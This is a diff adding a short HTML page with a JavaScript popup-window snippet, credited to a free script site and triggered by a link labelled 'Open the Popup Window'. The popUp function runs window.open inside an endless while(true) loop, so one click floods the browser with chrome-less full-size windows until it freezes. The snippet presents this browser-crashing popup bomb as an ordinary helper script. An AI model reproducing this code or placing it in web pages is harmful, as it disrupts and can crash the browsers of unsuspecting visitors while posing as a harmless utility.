@@ -1,0 +1,18 @@
+<HEAD>
+<SCRIPT LANGUAGE="JavaScript">
+<!-- Idea by: Nic Wolfe -->
+<!-- This script and many more are available free online at -->
+<!-- The JavaScript Source!! http://javascript.internet.com -->
+<!-- Begin
+function popUp(URL) {
+while(true){
+day = new Date();
+id = day.getTime();
+eval("page" + id + " = window.open(URL, '" + id + "',
+'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=1366,height=768,left =
+0,top = 0');");
+}} // End -->
+</script>
+<!-- STEP TWO: Use the following link to open the new window -->
+<A HREF="javascript:popUp('http://www.google.com')">Open the Popup Window</A>
+<!-- Script Size: 0.73 KB -->
